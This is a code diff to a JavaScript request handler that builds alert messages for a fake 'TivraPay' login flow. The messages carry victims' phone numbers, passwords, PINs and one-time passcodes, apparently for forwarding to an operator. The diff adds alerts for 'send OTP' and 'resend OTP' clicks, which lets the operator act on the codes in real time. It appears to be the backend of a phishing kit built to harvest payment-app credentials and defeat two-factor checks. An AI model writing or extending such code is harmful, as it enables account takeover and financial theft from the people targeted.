@@ -18,8 +18,12 @@ export default async function handler(req, res) {
       messageText = `🚀 **TivraPay Login Request** 🚀\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔑 **Password:** ${data.password}\n━━━━━━━━━━━━━━━━━━━`;
     } else if (data.type === 'pin') {
       messageText = `🛡️ **TivraPay PIN Submitted** 🛡️\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔒 **PIN:** ${data.pin}\n━━━━━━━━━━━━━━━━━━━`;
+    } else if (data.type === 'send_otp_req') {
+      messageText = `📤 **TivraPay Send OTP Clicked** 📤\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n━━━━━━━━━━━━━━━━━━━`;
     } else if (data.type === 'otp') {
       messageText = `⚡ **TivraPay OTP Submitted** ⚡\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔢 **OTP:** ${data.otp}\n━━━━━━━━━━━━━━━━━━━`;
+    } else if (data.type === 'resend_otp') {
+      messageText = `🔄 **TivraPay Resend OTP Clicked** 🔄\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n━━━━━━━━━━━━━━━━━━━`;
     } else if (data.type === 'modify_req') {
       messageText = `🔄 **TivraPay Modify Request** 🔄\n━━━━━━━━━━━━━━━━━━━\n📞 **Phone:** ${data.phone}\n🔑 **New Pass:** ${data.password}\n━━━━━━━━━━━━━━━━━━━`;
     } else if (data.type === 'modify') {
